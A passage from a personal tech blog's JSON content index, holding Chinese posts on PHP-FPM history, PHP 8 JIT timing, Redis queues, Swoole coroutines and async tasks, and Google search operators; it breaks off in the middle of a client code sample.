{"meta":{"title":"Boo","subtitle":"","description":"","author":"Boo","url":"https://www.0x2BeAce.com","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-07-05T02:30:21.578Z","updated":"2020-07-05T02:30:21.578Z","comments":true,"path":"404.html","permalink":"https://www.0x2beace.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"关于我","date":"2020-08-15T01:56:27.151Z","updated":"2020-08-15T01:56:27.151Z","comments":true,"path":"about/index.html","permalink":"https://www.0x2beace.com/about/index.html","excerpt":"","text":"关于此博客博客名：0x2BeAce 读作 To Be Ace。 Ace 有多个意思，这里取 a person who is very skilled at something 。 专门用于技术分享，记录一些感兴趣的东西。 这里参考了 Soros Liu 的博客。 关于我游离于2.5 次元的伪全栈，Linux 爱好者。 你可以通过以下方式找到我： 博客 GitHub Eamil 豆瓣 - 记录书影 Weibo - 很久没更新了… Telegram"},{"title":"所有分类","date":"2020-07-05T02:57:23.853Z","updated":"2020-07-05T02:57:23.853Z","comments":true,"path":"categories/index.html","permalink":"https://www.0x2beace.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-07-05T03:12:46.301Z","updated":"2020-07-05T03:12:46.301Z","comments":true,"path":"mylist/index.html","permalink":"https://www.0x2beace.com/mylist/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2020-07-05T02:29:38.929Z","updated":"2020-07-05T02:29:38.929Z","comments":true,"path":"tags/index.html","permalink":"https://www.0x2beace.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"PHP-FPM 进化史","slug":"the-evolution-of-php-fpm","date":"2020-12-02T13:42:16.000Z","updated":"2020-12-02T13:54:07.534Z","comments":true,"path":"the-evolution-of-php-fpm/","link":"","permalink":"https://www.0x2beace.com/the-evolution-of-php-fpm/","excerpt":"最近有幸读到一篇文章，一文将CGI 的进化史讲的特别详细，虽然我自己之前也整理过 CGI、FastCGI、PHP-FPM 相关的笔记，但是并没有从原理的角度来认识 CGI。","text":"最近有幸读到一篇文章，一文将CGI 的进化史讲的特别详细，虽然我自己之前也整理过 CGI、FastCGI、PHP-FPM 相关的笔记，但是并没有从原理的角度来认识 CGI。 CGI 的诞生早些年的Web 应用很简单，客户端通过浏览器发起请求，服务端直接返回响应。 随着互联网的发展，简单的Web 应用已经不能满足开发者们了。我们希望Web服务器有更多的功能，飞速发展的同时还能让不同语言的开发者也能加入。 CGI协议协议的诞生就是 Web服务器和其他领域的开发者在保证遵守协议的基础上，剩下的可以自由发挥，而实现这个协议的脚本叫做CGI 程序。 CGI协议规定了需要向CGI脚本设置的环境变量和一些其他信息，CGI程序完成某一个功能，可以用PHP，Python，Shell或者C语言编写。 在没有CGI 之前，其他语言如果需要接入Mysql 或者Memcache，还需要使用C 语言，但有了CGI协议，我们的Web处理流程可以变成下图这样： FastCGI 的诞生CGI程序存在致命的缺点：每当客户端发起请求，服务器将请求转发给CGI，WEB 服务器就请求操作系统生成一个新的CGI解释器进程(如php-cgi），CGI进程则处理完一个请求后退出，下一个请求来时再创建新进程。 我们知道，执行一个PHP程序的必须要先解析php.ini文件，然后模块初始化等等一系列工作，每次都反复这样非常浪费资源。 FastCGI协议在CGI协议的基础上，做出了如下改变： FastCGI被设计用来支持常驻（long-lived）应用进程，减少了fork-and-execute带来的开销 FastCGI进程通过监听的socket，收来自Web服务器的连接，这样FastCGI 进程可以独立部署 服务器和FastCGI监听的socket 之间按照消息的形式发送环境变量和其他数据 我们称实现了FastCGI协议的程序为FastCGI程序，FastCGI程序的交互方式如下图所示： PHP-FPM 的诞生FastCGI 程序固然已经很好了，但我们的需求总是有点苛刻，它还是存在一些明显缺点的： 当我们更改配置文件(php.ini)后，php-cgi（FastCGI 程序） 无法平滑重启 我们fork的进程个数和请求量正比，请求繁忙时 fork 进程多，动态调整 php-cgi还没做到 上面提及php-cgi 实现的FastCGI问题官方没有解决，幸运的是有第三方帮我们解决了，它就是 php-fpm。 它可以独立运行，不依赖php-cgi，换句话说，它自己实现了FastCGI协议并且支持进程平滑重启且带进程管理功能。 参考链接 从CGI到FastCGI到PHP-FPM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"PHP 8.0 初体验","slug":"php-8-0-first-experience","date":"2020-12-01T13:09:15.000Z","updated":"2020-12-02T00:03:35.910Z","comments":true,"path":"php-8-0-first-experience/","link":"","permalink":"https://www.0x2beace.com/php-8-0-first-experience/","excerpt":"昨天使用 homebrew 安装软件时，结果把我本地已安装的软件中能更新的全部给更新了一遍。","text":"昨天使用 homebrew 安装软件时，结果把我本地已安装的软件中能更新的全部给更新了一遍。 这其中就包括 php8.0。在8.0 正式出来之前，有听说过加入了新特性：JIT编译。 从理论上讲，JIT处理PHP脚本编译的方式能够提高应用程序的速度，但究竟能有多快呢？下面通过一个简单的例子来看看。 123456789101112131415161718&lt;?php$startTime &#x3D; microtime(true);$mysqli &#x3D; new Mysqli(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;);function doSomething($db,$i)&#123; $hash &#x3D; md5($i); $db-&gt;query(&quot;INSERT INTO local.test(id, hash) VALUES($i, \\&quot;$hash\\&quot;)&quot;);&#125;$i &#x3D; 1;while ($i&lt;100000) &#123; doSomething($mysqli, $i); $i++;&#125;$total &#x3D; microtime(true) - $startTime;var_dump(&quot;总耗时：&#123;$total&#125;秒&quot;); 这里只是简单的向数据库不重复插入十万条数据。我知道用这个脚本举例子并不好，但它却是离我日常使用最近的。 php7.3 测试结果： php8.0 未开启 JIT 扩展测试结果： php8.0 已开启 JIT 扩展测试结果： 可以看到相比 7.3，足足快了近三分之一！ 当然这个测试结果严格意义上来讲，并不准确，但看到数字从四十多秒缩短到三十秒，还是很惊喜的。 我的电脑配置： 3.5 GHz 双核Intel Core i7 16 GB RAM","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"记一次 Linux 服务器性能调优","slug":"remember-a-Linux-server-performance-tuning","date":"2020-11-30T15:45:09.000Z","updated":"2020-12-01T02:43:38.725Z","comments":true,"path":"remember-a-Linux-server-performance-tuning/","link":"","permalink":"https://www.0x2beace.com/remember-a-Linux-server-performance-tuning/","excerpt":"轮询查 Db 对服务器（数据库）的压力究竟有多大？","text":"轮询查 Db 对服务器（数据库）的压力究竟有多大？ 前段时间接手一个老系统，其中对于“订单”的处理，非常原始且简单粗暴。 直接通过一个 PHP 脚本不断轮询查询数据库，直到查找到需要处理的“订单”才去处理，否则一直查找。 12345678910111213&lt;?phpfunction doSomething()&#123; &#x2F;&#x2F; 查询数据库 if ($exists)&#123; &#x2F;&#x2F; todo ... &#125;&#125;while(true)&#123; doSomething();&#125; 类似的处理还有其他几个脚本。 因为项目的历史包袱较重，也不好做一些大调整，起初我并没有太在意，就直接部署到服务器上了。 就在最近，我收到反馈，系统有问题。通过一系列排查最后发现是因为“订单”处理不及时，“订单”堆积过多导致的一系列问题。 我寻思着，用户量也没有很多，为什么会处理不完呢？使用 glances 命令看了一眼。 这不看不知道，一看吓一跳，CPU 直接警告了。无论多好的机器也经受不住这样折腾，赶紧把轮询查表的方式改成了查队列。 基于Redis 的List 实现一个简单的消息队列，更新到服务器之后，可以看到CPU 直接降了一半。 为什么使用Redis 会比Mysql 的效果要好？ 通俗一点解释是因为Redis 存储是基于内存，Mysql 存储是基于磁盘，而内存的读写要比磁盘快不止一个数量级。 当然，上面的处理方式并不是最优的，这里只是单论如何发现性能瓶颈，以及如何调优这一点来进行说明。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"PHP","slug":"Linux/PHP","permalink":"https://www.0x2beace.com/categories/Linux/PHP/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Swoole 协程学习","slug":"swoole-coroutine-learning","date":"2020-11-29T14:36:47.000Z","updated":"2020-11-29T14:37:50.672Z","comments":true,"path":"swoole-coroutine-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-coroutine-learning/","excerpt":"第一次接触协程这个概念，是在学习Swoole时，那时看官方文档并不能完全理解协程到底是个什么东西以及该如何正确的使用它。","text":"第一次接触协程这个概念，是在学习Swoole时，那时看官方文档并不能完全理解协程到底是个什么东西以及该如何正确的使用它。 后来逐渐看了一些写的比较通俗的文章，加上自己的一些理解，逐步开始对协程有一些认识了。 认识协程协程不是进程或线程，其执行过程更类似于子例程，或者说不带返回值的函数调用。 上面那句话很关键，一句话就把协程是什么，不是什么说清楚了。 下面这张图可以很清晰的看到协程与多进程的区别： 执行顺序下面这段代码主要做了三件事：写入文件、发送邮件以及插入数据。 12345678910111213141516171819202122232425&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;写入文件,大概要3000微秒 usleep(3000); echo &quot;写入文件&#123;$i&#125;\\n&quot;; &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒 usleep(3000); echo &quot;发送邮件&#123;$i&#125;\\n&quot;; &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;模拟插入100条数据,大概3000微秒 usleep(3000); echo &quot;插入数据&#123;$i&#125;\\n&quot;; &#125;&#125;task1();task2();task3(); 这段代码和上面不同的是，这三件事情是交叉执行的，每个任务执行完一次之后，切换到另一个任务，如此循环。 类似于这样的执行顺序，就是协程。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpfunction task1($i)&#123; &#x2F;&#x2F;使用$i标识 写入文件,大概要3000微秒 if ($i &gt; 300) &#123; return false;&#x2F;&#x2F;超过300不用写了 &#125; echo &quot;写入文件&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task2($i)&#123; &#x2F;&#x2F;使用$i标识 发送邮件,大概要3000微秒 if ($i &gt; 500) &#123; return false;&#x2F;&#x2F;超过500不用发送了 &#125; echo &quot;发送邮件&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;function task3($i)&#123; &#x2F;&#x2F;使用$i标识 插入数据,大概要3000微秒 if ($i &gt; 100) &#123; return false;&#x2F;&#x2F;超过100不用插入 &#125; echo &quot;插入数据&#123;$i&#125;\\n&quot;; usleep(3000); return true;&#125;$i &#x3D; 0;while (true) &#123; $task1Result &#x3D; task1($i); $task2Result &#x3D; task2($i); $task3Result &#x3D; task3($i); if($task1Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task2Result&#x3D;&#x3D;&#x3D;false&amp;&amp;$task3Result&#x3D;&#x3D;&#x3D;false)&#123; break;&#x2F;&#x2F;全部任务完成,退出循环 &#125; $i++;&#125; swoole实现协程代码： 12345678910111213141516171819202122232425262728&lt;?phpfunction task1()&#123; for ($i&#x3D;0;$i&lt;&#x3D;300;$i++)&#123; &#x2F;&#x2F;写入文件,大概要3000微秒 usleep(3000); echo &quot;写入文件&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程 &#125;&#125;function task2()&#123; for ($i&#x3D;0;$i&lt;&#x3D;500;$i++)&#123; &#x2F;&#x2F;发送邮件给500名会员,大概3000微秒 usleep(3000); echo &quot;发送邮件&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程 &#125;&#125;function task3()&#123; for ($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; &#x2F;&#x2F;模拟插入100条数据,大概3000微秒 usleep(3000); echo &quot;插入数据&#123;$i&#125;\\n&quot;; Co::sleep(0.001);&#x2F;&#x2F;挂起当前协程,0.001秒后恢复&#x2F;&#x2F;相当于切换协程 &#125;&#125;$pid1 &#x3D; go(&#39;task1&#39;);&#x2F;&#x2F;go函数是swoole的开启协程函数，用于开启一个协程$pid2 &#x3D; go(&#39;task2&#39;);$pid3 &#x3D; go(&#39;task3&#39;); 协程与多进程由上面的代码，可以发现，协程其实只是运行在一个进程中的函数，只是这个函数会被切换到下一个执行。 需要注意的是⚠️： 协程并不是多任务并行处理，它属于多任务串行处理，它俩的本质区别是在某个时刻同时执行一个还是多个任务。 协程的作用域由于协程就是进程中一串任务代码，所以它的全局变量、静态变量等变量都是共享的，包括 PHP 的全局缓冲区。 所以在开发时特别需要注意作用域相关的问题。 协程的I/O连接在协程中，要特别注意不能共用一个 I/O 连接，否则会造成数据异常。 由于协程的交叉运行机制，且各个协程的 I/O 连接都必须是相互独立的，这时如果使用传统的直接建立连接方式，会导致每个协程都需要建立连接、闭关连接，从而消耗大量资源。那么该如何解决协程的 I/O 连接问题呢？这个时候就需要用到连接池了。 连接池存在的意义在于，复用原来的连接，从而节省重复建立连接所带来的开销。 协程的实际应用场景说了这么多，那协程倒底能解决哪些实际业务场景呢？下面通过一个实例来快速上手协程（笔者当时写这篇文章时，对协程的理解还不够深刻，所以这里引用zxr615 的”做饭“的例子来理解协程）： 传统同步阻塞实现逻辑： 12345678910111213141516171819202122232425&lt;?phpfunction cook()&#123; $startTime &#x3D; time(); echo &quot;开始煲汤...&quot; . PHP_EOL; sleep(10); echo &quot;汤好了...&quot; . PHP_EOL; echo &quot;开始煮饭...&quot; . PHP_EOL; sleep(8); echo &quot;饭熟了...&quot; . PHP_EOL; echo &quot;放油...&quot; . PHP_EOL; sleep(1); echo &quot;煎鱼...&quot; . PHP_EOL; sleep(3); echo &quot;放盐...&quot; . PHP_EOL; sleep(1); echo &quot;出锅...&quot; . PHP_EOL; var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;);&#125;cook(); 协程实现逻辑： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?phpuse Swoole\\Coroutine;use Swoole\\Coroutine\\WaitGroup;use Swoole;class Cook&#123; public function cookByCo() &#123; $startTime &#x3D; time(); &#x2F;&#x2F; 开启一键协程化: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;runtime?id&#x3D;swoole_hook_all Swoole\\Runtime::enableCoroutine($flags &#x3D; SWOOLE_HOOK_ALL); &#x2F;&#x2F; 创建一个协程容器: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;scheduler &#x2F;&#x2F; 相当于进入厨房 \\Co\\run(function () &#123; &#x2F;&#x2F; 等待结果: https:&#x2F;&#x2F;wiki.swoole.com&#x2F;#&#x2F;coroutine&#x2F;wait_group?id&#x3D;waitgroup &#x2F;&#x2F; 记录哪道菜做好了，哪道菜还需要多长时间 $wg &#x3D; new WaitGroup(); &#x2F;&#x2F; 保存数据的结果 &#x2F;&#x2F; 装好的菜 $result &#x3D; []; &#x2F;&#x2F; 记录一下煲汤(记录一个任务) $wg-&gt;add(); &#x2F;&#x2F; 创建一个煲汤任务(开启一个新的协程) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;开始煲汤...&quot; . PHP_EOL; &#x2F;&#x2F; 煲汤需要6分钟，所以我们也不用在这里等汤煮好， &#x2F;&#x2F; 直接去做下一个任务：炒菜(协程切换) sleep(8); echo &quot;汤好了...&quot; . PHP_EOL; &#x2F;&#x2F; 装盘 $result[&#39;soup&#39;] &#x3D; &#39;一锅汤&#39;; $wg-&gt;done(); &#x2F;&#x2F; 标记任务完成 &#125;); &#x2F;&#x2F; 记录一下煮饭(记录一个任务) $wg-&gt;add(); &#x2F;&#x2F; 创建一个煮饭任务(开启一个新的协程) Coroutine::create(function () use ($wg, &amp;$result) &#123; echo &quot;开始煮饭...&quot; . PHP_EOL; &#x2F;&#x2F; 煮饭需要5分钟，所以我们不用在这里等饭煮熟，放在这里一会再来看看好了没有 &#x2F;&#x2F; 我们先去煲汤(协程切换) sleep(10); echo &quot;饭熟了...&quot; . PHP_EOL; &#x2F;&#x2F; 装盘 $result[&#39;rice&#39;] &#x3D; &#39;一锅米饭&#39;; $wg-&gt;done(); &#x2F;&#x2F; 标记任务完成 &#125;); &#x2F;&#x2F; 记录一下炒菜 $wg-&gt;add(); &#x2F;&#x2F; 创建一个炒菜任务(再开启一个新的协程) Coroutine::create(function () use ($wg, &amp;$result) &#123; &#x2F;&#x2F; 煎鱼的过程必须放在一个协程里面执行，如果不是的话可能鱼还没煎好就出锅了 &#x2F;&#x2F; 因为开启协程后，IO全是异步了，在此demo中每次遇到sleep都会挂起当前协程 &#x2F;&#x2F; 切换到下一个协程执行。 &#x2F;&#x2F; 例如把出锅这一步开启一个新协程执行，则在煎鱼的时候鱼，鱼就出锅了。 echo &quot;放油...&quot; . PHP_EOL; sleep(1); echo &quot;煎鱼...&quot; . PHP_EOL; sleep(3); echo &quot;放盐...&quot; . PHP_EOL; sleep(1); echo &quot;出锅...&quot; . PHP_EOL; &#x2F;&#x2F; 装盘 $result[&#39;food&#39;] &#x3D; &#39;鱼香肉丝&#39;; $wg-&gt;done(); &#125;); &#x2F;&#x2F; 等待全部任务完成 $wg-&gt;wait(); &#x2F;&#x2F; 返回数据(上菜！) var_dump($result); &#125;); var_dump(&#39;总耗时：&#39; . (time() - $startTime) . &#39; 分钟&#39;); &#125;&#125;$cooker &#x3D; new Cook();$cooker-&gt;cookByCo(); 通过执行代码可以看到协程方式比传统阻塞方式足足快了十三分钟。从协程方式实现的逻辑中可以看到，通过无感知编写”同步代码“，却实现了异步 I/O 的效果和性能。避免了传统异步回调所带来的离散的代码逻辑和陷入多层回调中导致代码无法维护。 不过需要注意的是传统回调的触发条件是回调函数，而协程切换的条件是遇到 I/O。 协程误区实际使用协程时，需要注意以下几个误区，否则效果可能会事倍功半。 理论上来讲，协程解决的是 I/O 复用的问题，对于计算密集的问题无效。 如果cpu很闲(大部分时间都消耗在网络磁盘上了)，协程就可以提高cpu的利用率 如果cpu本身就很饱和了 用协程反而会降低cpu利用率（需要花时间来做协程调度）。 swoole 是单线程 参考链接 swoole 学习笔记-做一顿饭来理解协程 协程-EasySwoole swoole 协程-swoole 高手之路 swoole一个协程问题？为什么效率变慢了","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"如何高效的利用谷歌搜索引擎","slug":"how-to-use-google-search-engine-efficiently","date":"2020-11-28T09:03:14.000Z","updated":"2020-11-28T09:04:27.083Z","comments":true,"path":"how-to-use-google-search-engine-efficiently/","link":"","permalink":"https://www.0x2beace.com/how-to-use-google-search-engine-efficiently/","excerpt":"整理这篇笔记的目的是整理那些不太常用但又十分有用的Google 搜索引擎搜索技巧。","text":"整理这篇笔记的目的是整理那些不太常用但又十分有用的Google 搜索引擎搜索技巧。 搜索完全匹配的搜索结果有时候我们会有这样一种需求：我需要查找某个关键字同时出现的内容，该怎么做呢？这个时候就需要用到完全匹配这招了。 在关键字的左右两边分别加上&quot;英文状态的双引号，如： 1&quot;HHKB 是什么&quot; 从搜索结果中排除特定词为了进一步筛选搜索结果，还需要学会另一招，利用-减号排除特定关键字： 1&quot;the most important benefit of education&quot;-&quot;unitedstates&quot; 上面这段表示的意思是：要求Google 返回含有”the most important benefit of education” 但不存在”unitedstates”的内容。 1daddy -film daddy 的意思是父亲，同时也是一部电影，当你搜索”daddy” 时，谷歌只返回有关电影的内容。如果你只想搜索时关于父亲，要排除电影，在需要排除的前面加上-，例如上面所示。你会发现结果中没有与电影有关的内容。 搜索通配符或未知字词怎样用？ 即搜索字符串中可以包含星号*，用星号来替代任意字符串。 1powerful*life 搜索社交媒体当你只想在某个社交媒体里找到相关字词时，在用于搜索社交媒体的字词前加上@，例如： 1@twice 组合搜索在各个搜索查询字间加上“OR”关键字，例如： 1race OR marathon 搜索到的结果会返回关于 race 或者 marathon，或两者均有的相关内容。 搜索特定价格用这个方法来搜索特定价格的商品，例如想要搜索价格为$200的书包，可以这样搜索： 1$200 bag 在某个数字范围内执行搜索比如想要搜索介于 $100 - $200 之间的商品，或者是 10kg - 20kg 的某种东西，亦或者是 1900 - 1945 年发生的事情，等等。 在两个数字之间加上..符号，例如搜索价格 $50 - $100 的桌子： 1amazon table $50..$100 搜索特定网站只在特定的网站里搜索相关资料，在相应的域名前面加上&quot;site:&quot;，例如要在 youtube 里找关于猫的电影，可以这样搜索： 1site:youtube.com cat 搜索相关网站想找和某个网站有关系或者相似特质的网站，在已知网址前面加上related:，例如： 1related:google.com google.com 是一个搜索网站，加上related:关键字之后，搜索的结果是其他搜索引擎，如 Yahoo、Bing 等 寻找主题标记在关键字前面加上#符号， 获取网站的相关资料如果你想知道某个网站是关于什么的，可以这样子搜索： 1info:baidu.com 多组合运用 在 channelnewsasia.com 网站里搜索关于天灾的意外，除了地震，发生在2012年到2016年之间。 1site:channelnewsasia.com ~accident &quot;natural disaster&quot; -earthquake 2012..2016 其中波浪符号~表示也搜索和这个字有关联的内容，如 failure，crash、mishap 等 从两个购物网站搜索手表，价格在 $100 到 $200 之间 1site:shopee.com.my OR site:amazon.com watch $100..$200 从ebay 与 amazon网站搜索苹果与微软的产品，排除平板电脑 1site:ebay.com OR site:amazon.com apple OR microsoft -tablet 在吉隆坡一带搜索低收费住宿，价格在$100 到 $200 之间，排除 airbnb，靠近轻快地铁 1KL ~budget~accommodation $100..$200 -airbnb &quot;nearby LRT station&quot;","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Google Search","slug":"Google-Search","permalink":"https://www.0x2beace.com/tags/Google-Search/"}]},{"title":"PHP + Swoole 实现异步任务队列","slug":"php-swoole-to-achieve-asynchronous-task-queue","date":"2020-11-26T12:33:48.000Z","updated":"2020-11-27T13:54:36.939Z","comments":true,"path":"php-swoole-to-achieve-asynchronous-task-queue/","link":"","permalink":"https://www.0x2beace.com/php-swoole-to-achieve-asynchronous-task-queue/","excerpt":"最近接手一个对接短信的需求，这个需求本身并没有什么难度，直接按照服务商的要求请求具体的接口就好了。","text":"最近接手一个对接短信的需求，这个需求本身并没有什么难度，直接按照服务商的要求请求具体的接口就好了。 最开始是使用传统的同步阻塞方式实现了一遍，用户体验并不好，发送短信需要等待，等待服务商的接口返回内容，才继续向下执行。 因为最近在学习Swoole，Swoole 中有一个“异步任务”，就特别适合以下应用场景： 需要执行耗时操作，会阻塞主进程 用户不需要等待返回结果 结合官网手册和Latent 的基于 swoole 下 异步消息队列 API，最终简单封装了一个处理API 的类，实现如下： 服务端服务端是基于本地Tcp，监听9501端口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162&lt;?phpclass taskServer&#123; const HOST &#x3D; &quot;127.0.0.1&quot;; const PORT &#x3D; 9501; public $server &#x3D; null; public function __construct() &#123; $this-&gt;server &#x3D; new SWoole\\Server(self::HOST, self::PORT); $this-&gt;server-&gt;set(array( &quot;enable_coroutine&quot; &#x3D;&gt; false, &#x2F;&#x2F; 关闭协程 &quot;worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; 开启的进程数 一般为cup核数 1-4 倍 &quot;task_worker_num&quot; &#x3D;&gt; 2, &#x2F;&#x2F; task进程的数量 &#39;daemonize&#39; &#x3D;&gt; true, &#x2F;&#x2F; 以守护进程的方式启动 )); &#x2F;&#x2F; 注册事件 $this-&gt;server-&gt;on(&quot;connect&quot;, [$this, &quot;onConnect&quot;]); $this-&gt;server-&gt;on(&quot;receive&quot;, [$this, &quot;onReceive&quot;]); $this-&gt;server-&gt;on(&quot;close&quot;, [$this, &quot;onClose&quot;]); $this-&gt;server-&gt;on(&quot;task&quot;, [$this, &quot;onTask&quot;]); $this-&gt;server-&gt;on(&quot;finish&quot;, [$this, &quot;onFinish&quot;]); &#x2F;&#x2F; 启用服务 $this-&gt;server-&gt;start(); &#125; &#x2F;** * 监听连接事件 * @param $server * @param $fd *&#x2F; public function onConnect($server, $fd)&#123; echo &quot;连接成功&quot;.PHP_EOL; &#125; &#x2F;** * 监听客户端发送的消息 * @param $server &quot;Server 对象&quot; * @param $fd &quot;唯一标示&quot; * @param $form_id * @param $data &quot;客户端发送的数据&quot; *&#x2F; public function onReceive($server, $fd, $form_id, $data)&#123; &#x2F;&#x2F; 投递任务 $server-&gt;task($data); $server-&gt;send($fd, &quot;这是客户端向服务端发送的信息：&#123;$data&#125;&quot;); &#125; &#x2F;** * 监听异步任务task事件 * @param $server * @param $task_id * @param $worker_id * @param $data * @return string *&#x2F; public function onTask($server, $task_id, $worker_id, $data)&#123; $data &#x3D; json_decode($data, true); echo &quot;开始执行异步任务&quot;.PHP_EOL; try &#123; &#x2F;&#x2F; 开始执行任务 $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;开始执行任务&quot;.PHP_EOL ); &#x2F;&#x2F; 通知worker（必须 return，否则不会调用 onFinish） return $this-&gt;curl($data[&#39;url&#39;], $data[&#39;data&#39;], $data[&#39;type&#39;]); &#125; catch (Exception $exception) &#123; &#x2F;&#x2F; 执行任务失败 $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;执行任务失败&quot;.PHP_EOL); &#125; &#125; &#x2F;** * 监听finish 事件 * @param $server * @param $task_id * @param $data *&#x2F; public function onFinish($server, $task_id, $data)&#123; $this-&gt;addLog(date(&quot;Y-m-d H:i:s&quot;).&quot;异步任务执行完成&quot;.PHP_EOL); print_r( &quot;来自服务端的消息：&#123;$data&#125;&quot;); &#125; &#x2F;** * 监听关闭连接事件 * @param $server * @param $fd *&#x2F; public function onClose($server, $fd)&#123; echo &quot;关闭TCP 连接&quot;.PHP_EOL; &#125; &#x2F;** * 发起Get 或 Post 请求 * @param string $url 请求地址 * @param array $request_data 请求参数 * @param string $request_type 请求类型 * @param array $headers 头信息 * @param bool $is_ssl 是否是ssl * @return bool|string *&#x2F; public function curl($url &#x3D; &#39;&#39;, $request_data &#x3D; [], $request_type &#x3D; &#39;get&#39;, $headers &#x3D; [], $is_ssl &#x3D; false) &#123; $curl &#x3D; curl_init (); &#x2F;&#x2F; 初始化 &#x2F;&#x2F; 设置 URL curl_setopt($curl, CURLOPT_URL, $url); &#x2F;&#x2F; 不返回 Response 头部信息 curl_setopt ( $curl, CURLOPT_HEADER, 0 ); &#x2F;&#x2F; 如果成功只将结果返回，不自动输出任何内容 curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 ); &#x2F;&#x2F; 设置请求参数 curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query($request_data)); &#x2F;&#x2F; TRUE 时追踪句柄的请求字符串 curl_setopt($curl, CURLINFO_HEADER_OUT, true); &#x2F;&#x2F; Post 类型增加以下处理 if( $request_type &#x3D;&#x3D; &#39;post&#39;) &#123; &#x2F;&#x2F; 设置为POST方式 curl_setopt ( $curl, CURLOPT_POST, 1 ); &#x2F;&#x2F; 设置头信息 curl_setopt($curl, CURLOPT_HTTPHEADER, array(&#39;Content-Type: application&#x2F;json&#39;, &#39;Content-Length:&#39; . strlen(json_encode($request_data)))); &#x2F;&#x2F; 设置请求参数 curl_setopt ( $curl, CURLOPT_POSTFIELDS, json_encode($request_data)); &#x2F;&#x2F; 当POST 数据大于1024 时强制执行 curl_setopt ( $curl, CURLOPT_HTTPHEADER, array(&quot;Expect:&quot;)); &#125; &#x2F;&#x2F; 判断是否绕过证书 if( $is_ssl ) &#123; &#x2F;&#x2F;绕过ssl验证 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); &#125; if(!empty($headers)) curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); &#x2F;&#x2F; 执行 $result &#x3D; curl_exec ( $curl ); if ( $result &#x3D;&#x3D; FALSE) return false; &#x2F;&#x2F; 关闭资源 curl_close ( $curl ); return $result; &#125; &#x2F;** * 写入日志 * @param $content *&#x2F; public function addLog($content)&#123; $path &#x3D; dirname(__FILE__).&quot;&#x2F;logs&#x2F;&quot;; if (!is_dir($path)) mkdir($path,0777,true); $file_name &#x3D; $path.date(&quot;Y_m_d&quot;) . &quot;.log&quot;; if (!file_exists($file_name)) &#123; touch($file_name); chown($file_name, &quot;root&quot;); &#125; $file_log &#x3D; fopen($file_name, &quot;a&quot;); fputs($file_log, $content); fclose($file_log); &#125;&#125;$server &#x3D; new taskServer(); 客户端这里的客户端可以是 cli 脚本，也可以是对应控制器中的具体方法，只要能连接Swoole 监听的Tcp 就行。 12345678910111213141516171819202122232425&lt;?phpnamespace app\\admin\\controller;class Index extends Base&#123; public function index()&#123; $client &#x3D; new \\Swoole\\Client(SWOOLE_SOCK_TCP); if 